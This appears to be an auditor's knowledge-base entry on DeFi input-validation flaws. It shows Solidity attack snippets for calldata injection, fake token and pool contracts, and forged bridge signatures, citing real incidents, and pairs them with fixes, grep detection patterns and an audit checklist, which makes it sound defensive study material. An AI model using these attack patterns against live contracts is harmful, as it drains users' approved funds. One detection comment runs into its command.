---
protocol: generic
chain: everychain
category: input_validation
vulnerability_type: missing_input_validation

# Pattern Identity (Required)
root_cause_family: missing_validation
pattern_key: missing_input_validation | external_functions | parameter_manipulation | fund_loss

# Interaction Scope
interaction_scope: single_contract

attack_type: parameter_manipulation
affected_component: external_functions

primitives:
  - calldata_validation
  - parameter_check
  - address_validation
  - token_validation
  - owner_verification
  - input_sanitization
  - whitelist_check
  - arbitrary_external_call

severity: critical
impact: fund_loss
exploitability: 0.85
financial_impact: critical

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "burn"
  - "swap"
  - "token"
  - "expiry"
  - "redeem"
  - "token_"
  - "approve"
  - "getPair"
  - "getPool"
  - "withdraw"
  - "address(0"
  - "balanceOf"
  - "ecrecover"
  - "pool.swap"
  - "anySwapOut"
path_keys:
  - "anyswap"
  - "olympusdao"
  - "orbitchain"
  - "socketgateway"
  - "sushiswap_routeprocessor2"

tags:
  - input_validation
  - parameter_check
  - calldata
  - missing_validation
  - arbitrary_call
  - address_validation
  - fake_token
  - owner_check
  - real_exploit
  - defi
  - DeFiHackLabs

source: DeFiHackLabs
total_exploits_analyzed: 43
total_losses: "$163.8M"
---

## Input Validation Vulnerabilities — DeFiHackLabs Patterns


## References & Source Reports

| Label | Source | Path / URL |
|-------|--------|------------|
| [ANYSWAP-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-01/Anyswap_exp.sol` |
| [OLYMPUSDAO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/OlympusDao_exp.sol` |
| [ORBITCHAIN-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-01/OrbitChain_exp.sol` |
| [PICKLE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2020-11/Pickle_exp.sol` |
| [SOCKETGATEWA-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-01/SocketGateway_exp.sol` |
| [SUSHIROUTER-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-04/Sushi_Router_exp.sol` |
| [TRANSITSWAP-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/TransitSwap_exp.sol` |

---

### Overview

Input validation vulnerabilities occur when smart contracts fail to properly validate function parameters, calldata, user-supplied addresses, or token contract references before processing them. Attackers exploit these gaps to forge signatures, impersonate tokens, inject arbitrary calldata, or bypass access controls — resulting in fund theft from protocols and their users.


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `missing_validation` |
| Pattern Key | `missing_input_validation | external_functions | parameter_manipulation | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | everychain |


### Vulnerability Description

#### Root Cause

The root causes fall into several distinct categories:

1. **Arbitrary Calldata Forwarding**: Functions that pass user-controlled calldata directly to external calls (e.g., `swapExtraData` forwarded as raw `.call()`), allowing attackers to craft `transferFrom` calls that drain approved users.

2. **Missing Token Whitelist/Registry**: Bridge or router functions accept arbitrary `token` addresses and call methods like `token.underlying()` without verifying the token is a legitimate registered asset. Attacker deploys a fake token contract that returns a real asset address.

3. **Unvalidated Callback Senders**: Functions like `uniswapV3SwapCallback` that don't verify `msg.sender` is a legitimate pool, allowing attackers to trigger callbacks from their own contracts.

4. **Missing Parameter Bounds**: Functions that accept critical parameters (amounts, addresses, quantities) without range checks, zero-address checks, or sanity validation.

5. **Forged Signature Arrays**: Bridge withdrawal functions that accept (v, r, s) signature arrays without verifying signers are authorized validators.

6. **Unvalidated Route/Pool References**: Router functions that accept attacker-specified pool addresses and interact with them as if they are legitimate AMM pools.

#### Attack Scenario

**Arbitrary Calldata Attack (SocketGateway pattern)**:
1. Attacker identifies a route that forwards `swapExtraData` as raw calldata to a token contract
2. Crafts `swapExtraData = abi.encodeWithSelector(IERC20.transferFrom.selector, victim, attacker, balance)`
3. Calls `executeRoute(routeId, routeData)` through the gateway
4. Gateway's route contract executes the malicious calldata against the token
5. Victim's approved tokens transferred to attacker

**Fake Token Attack (Anyswap pattern)**:
1. Attacker deploys contract implementing `underlying() → WETH`, `burn() → true`
2. Calls bridge function with attacker contract as the `token` parameter
3. Bridge calls `token.underlying()` → gets real asset (WETH)
4. Bridge calls `WETH.transferFrom(victim, bridge, amount)` using victim's approval
5. Bridge calls `token.burn()` → attacker contract no-ops
6. Attacker receives the real assets on the destination chain

---

### Vulnerable Pattern Examples

#### Category 1: Arbitrary Calldata Forwarding [CRITICAL]

> **pathShape**: `atomic`

**Example 1: SocketGateway — Route Calldata Injection (2024-01, ~$3.3M)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Route passes user-controlled swapExtraData as raw external call
interface ISocketGateway {
    function executeRoute(
        uint32 routeId,
        bytes calldata routeData
    ) external payable returns (bytes memory);
}

interface ISocketVulnRoute {
    function performAction(
        address fromToken,
        address toToken,
        uint256 amount,
        address receiverAddress,
        bytes32 metadata,
        bytes calldata swapExtraData  // @audit Arbitrary calldata — passed directly to external call
    ) external payable returns (uint256);
}

// Attack: Craft swapExtraData as a transferFrom() to drain an approved victim
bytes memory callDataX = abi.encodeWithSelector(
    IERC20.transferFrom.selector,
    victim,             // from: the victim who approved SocketGateway
    address(this),      // to: attacker
    IERC20(token).balanceOf(victim)  // amount: drain entire balance
);

// @audit Wrap as route data and execute through the gateway
bytes memory routeData = abi.encodeWithSelector(
    ISocketVulnRoute.performAction.selector,
    token, token, 0, address(this), bytes32(""), callDataX
);
gateway.executeRoute(406, routeData);
// Result: victim's USDC transferred to attacker via gateway's approval
```
- **PoC**: `DeFiHackLabs/src/test/2024-01/SocketGateway_exp.sol`
- **Attack TX**: https://etherscan.io/tx/0xc6c3331fa8c2d30e1ef208424c08c039a89e510df2fb6ae31e5aa40722e28fd6
- **Root Cause**: Newly added route (ID 406) forwarded user `swapExtraData` as raw calldata to `token.call(swapExtraData)`. Since victims had approved SocketGateway for token spending, the attacker could inject `transferFrom` calls.

**Example 2: TransitSwap — Arbitrary External Call via Raw Calldata (2022-10, ~$21M)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Transit Swap accepts raw calldata for external call
// The swap function performs:
//   (bool success,) = callTo.call(callData);
// where both callTo and callData are user-supplied

// Attack contract encodes transferFrom to drain approved users:
bytes memory attackCalldata = abi.encodeWithSelector(
    IERC20.transferFrom.selector,
    victim,           // @audit User who approved TransitSwap contract
    attacker,         // @audit Attacker's address as recipient
    victimBalance     // @audit Drain entire approved balance
);
// @audit callTo = token address, callData = malicious transferFrom
transitSwap.swap(token, attackCalldata, /* other params */);
```
- **PoC**: `DeFiHackLabs/src/test/2022-10/TransitSwap_exp.sol`
- **Attack TX**: https://bscscan.com/tx/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189
- **Root Cause**: Swap function accepted and executed arbitrary calldata against arbitrary addresses without verifying the call target or validating the calldata content.

---

#### Category 2: Fake Token / Unvalidated Token Address [CRITICAL]

> **pathShape**: `atomic`

**Example 3: Anyswap (Multichain) — Fake Token Impersonation (2022-01, ~$1.4M)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Bridge accepts arbitrary token address, trusts token.underlying()
// AnyswapV4Router:
function anySwapOutUnderlyingWithPermit(
    address from,
    address token,    // @audit Attacker-controlled — no whitelist check
    address to,
    uint256 amount,
    uint256 deadline,
    uint8 v, bytes32 r, bytes32 s,
    uint256 toChainID
) external {
    // Calls token.underlying() to find the real asset
    address realToken = AnyswapV1ERC20(token).underlying();
    // @audit Trusts the return value — attacker's contract returns WETH
    IERC20(realToken).transferFrom(from, address(this), amount);
    // Burns the fake "anyToken"
    AnyswapV1ERC20(token).burn(from, amount);
    // @audit No-op on attacker's contract
}

// Attacker deploys a fake anyToken contract:
contract FakeAnyToken {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function underlying() external view returns (address) {
        return WETH;  // @audit Returns real WETH address
    }
    function burn(address, uint256) external returns (bool) {
        return true;  // @audit No-op — doesn't actually burn anything
    }
    function depositVault(uint256, address) external returns (uint256) {
        return 1;     // @audit Stub to pass any other checks
    }
}

// Attack execution:
anyswapRouter.anySwapOutUnderlyingWithPermit(
    victim,            // from: victim who approved the router for WETH
    address(fakeToken), // token: attacker's fake contract
    attacker,          // to: attacker on destination chain
    victimBalance,
    deadline, 0, "0x", "0x",  // dummy permit (signature check bypassed)
    56                 // toChainID
);
// Result: Router transfers victim's WETH to itself, calls fakeToken.burn() (no-op)
// Attacker receives equivalent on BSC
```
- **PoC**: `DeFiHackLabs/src/test/2022-01/Anyswap_exp.sol`
- **Root Cause**: `anySwapOutUnderlyingWithPermit` accepts any address as `token` and calls `token.underlying()` to determine the real asset. No whitelist or registry check — attacker deploys a contract that impersonates an anyToken.

**Example 4: OlympusDAO — Fake Bond Token Redemption (2022-10, ~$292K)** [HIGH]
```solidity
// ❌ VULNERABLE: Bond teller accepts any token implementing the expected interface
interface IBondFixedExpiryTeller {
    function redeem(
        address token_,  // @audit Arbitrary ERC20 address — no whitelist
        uint256 amount_
    ) external;
}

// Attacker deploys a fake bond token with required stubs:
contract FakeBondToken {
    address public underlying_;
    uint48 public expiry_;

    constructor(address _underlying, uint48 _expiry) {
        underlying_ = _underlying;
        expiry_ = _expiry;  // @audit Set to a past timestamp
    }

    function underlying() external view returns (address) {
        return underlying_;  // @audit Returns OHM address
    }
    function expiry() external view returns (uint48) {
        return expiry_;      // @audit Returns past timestamp so redeem succeeds
    }
    function burn(address, uint256) external {}  // @audit No-op
    function balanceOf(address) external view returns (uint256) {
        return type(uint256).max;  // @audit Always has "enough" balance
    }
    function transferFrom(address, address, uint256) external returns (bool) {
        return true;  // @audit No-op transfer
    }
}

// Attack execution:
FakeBondToken fakeToken = new FakeBondToken(OHM_ADDRESS, pastTimestamp);
bondTeller.redeem(address(fakeToken), ohmAmount);
// @audit Teller calls fakeToken.burn() (no-op), then sends real OHM to attacker
```
- **PoC**: `DeFiHackLabs/src/test/2022-10/OlympusDao_exp.sol`
- **Attack TX**: https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf
- **Root Cause**: Bond teller's `redeem()` accepts any address as `token_`, calls `token_.underlying()` and `token_.expiry()` to determine payout. No verification against registered bond tokens.

---

#### Category 3: Unvalidated Callback / Pool Address [HIGH]

> **pathShape**: `callback-reentrant`

**Example 5: SushiSwap RouteProcessor2 — Fake Pool Callback (2023-04, ~$3.3M)** [HIGH]
```solidity
// ❌ VULNERABLE: processRoute accepts attacker's contract as pool address
interface IRouteProcessor2 {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,  // @audit Even with slippage, the pool itself is fake
        address to,
        bytes memory route     // @audit Pool address encoded in route bytes
    ) external payable returns (uint256 amountOut);
}

// The route bytes encode a series of pool hops. The attacker specifies
// their own contract as a "Uniswap V3 pool":
// Route: [pool=attackerContract, direction=1, tokenIn, ...]

// Attacker's fake pool contract:
contract FakePool {
    // @audit RouteProcessor calls swap() on this "pool"
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256, int256) {
        // Trigger the callback on the caller (RouteProcessor)
        // @audit RouteProcessor.uniswapV3SwapCallback doesn't verify msg.sender
        IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(
            amountSpecified, 0, data
        );
        return (amountSpecified, 0);
    }
}

// When RouteProcessor receives the callback, it pays tokens to msg.sender
// thinking it's a legitimate pool — but msg.sender is the attacker's contract
```
- **PoC**: `DeFiHackLabs/src/test/2023-04/Sushi_Router_exp.sol`
- **Root Cause**: `processRoute()` accepts any address as a pool in its encoded route and calls `pool.swap()`. The `uniswapV3SwapCallback` doesn't verify that `msg.sender` is a legitimate factory-deployed pool.

---

#### Category 4: Forged Signature / Insufficient Signer Validation [CRITICAL]

> **pathShape**: `atomic`

**Example 6: OrbitChain — Forged Bridge Withdrawal Signatures (2024-01, ~$81M)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Bridge accepts signature arrays without verifying signers are authorized
interface IOrbitBridge {
    function withdraw(
        address hubContract,
        string memory fromChain,
        bytes memory toAddr,
        address token,
        bytes32[] memory bytes32s,  // @audit Contains r values
        uint[] memory uints,        // @audit Contains amounts + s values
        uint8[] memory v            // @audit Signature v values
    ) external;
}

// The bridge verifies ECDSA signatures but doesn't check if the recovered
// addresses are actually authorized validators:
function _validateSignatures(
    bytes32 hash,
    uint8[] memory v,
    bytes32[] memory r,
    bytes32[] memory s
) internal view returns (bool) {
    for (uint i = 0; i < v.length; i++) {
        address signer = ecrecover(hash, v[i], r[i], s[i]);
        // @audit Missing: require(isValidator[signer], "not authorized")
        // Only checks that ecrecover succeeded, not that signer is a validator
        require(signer != address(0), "invalid signature");
    }
    return true;
}

// Attacker generates valid ECDSA signatures from arbitrary private keys
// Bridge accepts them because it only checks signature validity, not authority
```
- **PoC**: `DeFiHackLabs/src/test/2024-01/OrbitChain_exp.sol`
- **Root Cause**: Bridge withdrawal function verifies that signatures are valid ECDSA signatures but doesn't check that the signers are authorized bridge validators. Attacker supplies signatures from self-generated keypairs.

---

### Impact Analysis

#### Technical Impact
- **Fund Drainage**: Approved tokens stolen via injected `transferFrom` calldata
- **Bridge Bypass**: Unauthorized cross-chain withdrawals through forged signatures
- **State Corruption**: Fake token interactions leave protocol in inconsistent state
- **Cascading Exploits**: Approval-based attacks can drain ALL users who ever approved the contract

#### Business Impact
- **Scale**: $163.8M total losses across 43 exploits (2017-2025)
- **Top Incident**: OrbitChain ($81M) — forged bridge signatures
- **Second Largest**: TransitSwap ($21M) — arbitrary calldata forwarding
- **User Trust**: Approval-based attacks affect users even if they aren't actively using the protocol

---

### Secure Implementation

**Fix 1: Whitelist/Registry for Token Addresses**
```solidity
// ✅ SECURE: Validate token against a registry before interacting
mapping(address => bool) public registeredTokens;

function anySwapOut(address token, address to, uint256 amount) external {
    require(registeredTokens[token], "token not registered");
    // @audit Only interact with whitelisted token contracts
    address underlying = AnyswapV1ERC20(token).underlying();
    IERC20(underlying).transferFrom(msg.sender, address(this), amount);
    AnyswapV1ERC20(token).burn(msg.sender, amount);
}
```

**Fix 2: Validate Callback Sender Against Factory**
```solidity
// ✅ SECURE: Verify callback caller is a legitimate pool from the factory
function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external override {
    // @audit Recompute expected pool address from factory + tokens + fee
    (address tokenIn, address tokenOut, uint24 fee) = abi.decode(data, (address, address, uint24));
    address expectedPool = IUniswapV3Factory(FACTORY).getPool(tokenIn, tokenOut, fee);
    require(msg.sender == expectedPool, "unauthorized callback");

    // Safe to pay tokens now — msg.sender is a verified pool
    if (amount0Delta > 0) IERC20(tokenIn).transfer(msg.sender, uint256(amount0Delta));
}
```

**Fix 3: Restrict Calldata Targets and Selectors**
```solidity
// ✅ SECURE: Whitelist allowed function selectors for external calls
mapping(bytes4 => bool) public allowedSelectors;

function executeRoute(bytes calldata routeData) external {
    (address target, bytes memory callData) = abi.decode(routeData, (address, bytes));

    bytes4 selector = bytes4(callData[:4]);
    // @audit Block dangerous selectors
    require(selector != IERC20.transferFrom.selector, "transferFrom blocked");
    require(selector != IERC20.approve.selector, "approve blocked");
    require(allowedSelectors[selector], "selector not whitelisted");

    (bool success,) = target.call(callData);
    require(success, "route execution failed");
}
```

**Fix 4: Validate Signature Authority**
```solidity
// ✅ SECURE: Verify recovered signers are authorized validators
mapping(address => bool) public isValidator;
uint256 public requiredSignatures;

function withdraw(bytes32 hash, uint8[] memory v, bytes32[] memory r, bytes32[] memory s) external {
    require(v.length >= requiredSignatures, "insufficient signatures");

    address[] memory signers = new address[](v.length);
    for (uint i = 0; i < v.length; i++) {
        address signer = ecrecover(hash, v[i], r[i], s[i]);
        require(signer != address(0), "invalid signature");
        // @audit Check signer is an authorized validator
        require(isValidator[signer], "signer not authorized");

        // Prevent duplicate signatures
        for (uint j = 0; j < i; j++) {
            require(signers[j] != signer, "duplicate signer");
        }
        signers[i] = signer;
    }
}
```

---

### Detection Patterns

```bash
# Arbitrary external call with user datagrep -rn "\.call(.*calldata\|\.call(.*data\|\.call(.*bytes" --include="*.sol"

# Missing msg.sender validation in callbacks
grep -rn "uniswapV3SwapCallback\|pancakeV3SwapCallback" --include="*.sol" | grep -v "require.*msg.sender\|factory"

# Token address used without whitelist
grep -rn "\.underlying()\|\.burn(" --include="*.sol" | grep -v "registered\|whitelist\|valid"

# Functions accepting arbitrary address parameters
grep -rn "function.*address.*token.*external\|function.*address.*pool.*external" --include="*.sol"

# ecrecover without authority check
grep -rn "ecrecover" --include="*.sol" | grep -v "isValidator\|authorized\|operator"
```

---

### Audit Checklist

1. **Do external call targets come from user input?** — If yes, verify a whitelist or registry restricts callable addresses
2. **Does the function forward user-supplied calldata to external calls?** — If yes, validate or restrict the calldata selectors (block `transferFrom`, `approve`, `delegatecall`)
3. **Are token addresses validated against a registry?** — Bridge/router functions must only interact with registered token contracts
4. **Do callback functions verify msg.sender?** — `uniswapV3SwapCallback` and similar must verify the caller is a factory-deployed pool
5. **Are signature signers checked for authority?** — `ecrecover` results must be checked against an authorized validator set
6. **Are pool/pair addresses user-supplied?** — If yes, verify against the factory's `getPool()` or `getPair()`
7. **Can zero or extreme values be passed?** — Check for `amount == 0`, `address(0)`, and overflow conditions
8. **Do permit functions validate the signature properly?** — Check for replay, expired deadline, and chain ID

---

### Real-World Examples

| Protocol | Date | Loss | Attack Vector | Chain |
|----------|------|------|---------------|-------|
| OrbitChain | 2024-01 | $81.0M | Forged bridge validator signatures | Ethereum |
| Transit Swap | 2022-10 | $21.0M | Arbitrary calldata → transferFrom injection | BSC |
| Pickle Finance | 2020-11 | $20.0M | Insufficient validation in strategy | Ethereum |
| PrismaFi | 2024-03 | $11.0M | Insufficient parameter validation | Ethereum |
| Lifiprotocol | 2024-07 | $10.0M | Arbitrary calldata in route execution | Ethereum |
| ExactlyProtocol | 2023-08 | $7.0M | Insufficient validation in market params | Ethereum |
| SushiSwap | 2023-04 | $3.3M | Fake pool in processRoute callback | Ethereum |
| SocketGateway | 2024-01 | $3.3M | Arbitrary swapExtraData in new route | Ethereum |
| GoodDollar | 2023-12 | $2.0M | Input validation + reentrancy combo | Ethereum |
| DoughFina | 2024-07 | $1.8M | Arbitrary calldata in DeFi connector | Ethereum |
| Multichain (Anyswap) | 2022-01 | $1.4M | Fake token impersonation via underlying() | Ethereum |
| Moonhacker | 2024-12 | $319K | Improper input validation | Optimism |
| OlympusDAO | 2022-10 | $292K | Fake bond token with stub functions | Ethereum |

---

### DeFiHackLabs PoC References

- **OrbitChain** (2024-01, $81.0M): `DeFiHackLabs/src/test/2024-01/OrbitChain_exp.sol`
- **Transit Swap** (2022-10, $21.0M): `DeFiHackLabs/src/test/2022-10/TransitSwap_exp.sol`
- **Pickle Finance** (2020-11, $20.0M): `DeFiHackLabs/src/test/2020-11/Pickle_exp.sol`
- **SushiSwap** (2023-04, $3.3M): `DeFiHackLabs/src/test/2023-04/Sushi_Router_exp.sol`
- **SocketGateway** (2024-01, $3.3M): `DeFiHackLabs/src/test/2024-01/SocketGateway_exp.sol`
- **Multichain (Anyswap)** (2022-01, $1.4M): `DeFiHackLabs/src/test/2022-01/Anyswap_exp.sol`
- **OlympusDAO** (2022-10, $292K): `DeFiHackLabs/src/test/2022-10/OlympusDao_exp.sol`

---

### Prevention Guidelines

1. **Never forward raw user calldata** to external calls without selector whitelisting
2. **Maintain a token registry** for bridge/router functions — reject unregistered addresses
3. **Verify callback senders** by recomputing the expected address from factory parameters
4. **Validate signature authority** — `ecrecover` is not enough; check the signer is an authorized entity
5. **Use the checks-effects-interactions pattern** for any function accepting external addresses
6. **Implement circuit breakers** for high-value operations with unusual parameters
7. **Test with adversarial inputs**: zero amounts, address(0), msg.sender as parameter, fake contracts

---

### Keywords

- input_validation
- arbitrary_call
- calldata_injection
- transferFrom_injection
- fake_token
- token_impersonation
- unvalidated_callback
- forged_signature
- bridge_withdrawal
- missing_whitelist
- parameter_manipulation
- DeFiHackLabs
- SocketGateway
- TransitSwap
- Anyswap
- OlympusDAO
- OrbitChain
- SushiSwap
- processRoute
- executeRoute
- swapExtraData
- underlying
- ecrecover

---

### Related Vulnerabilities

- [Slippage & Input Validation](../validation/slippage-input-validation-vulnerabilities.md) — Overlapping patterns for parameter validation
- [Signature Vulnerabilities](../signature/) — ECDSA and EIP-712 signature patterns
- [Arbitrary Call Patterns](../arbitrary-call/) — Generic arbitrary external call vulnerabilities
- [Bridge Vulnerabilities](../../bridge/) — Cross-chain bridge security patterns
